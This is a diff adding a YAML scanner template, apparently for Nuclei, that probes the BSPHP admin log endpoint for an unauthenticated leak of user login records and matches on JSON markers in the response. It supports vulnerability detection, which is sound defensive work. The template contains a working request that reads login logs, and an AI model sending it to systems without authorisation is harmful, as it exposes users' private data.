@@ -1,0 +1,20 @@
+id: poc-yaml-bsphp-verify-system-info-leak
+info:
+  name: BSPHP Verify System Info Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{\"data\":[{\"key\":"
+        part: body
+      - type: word
+        words:
+          - "\"code\":0"
+        part: body
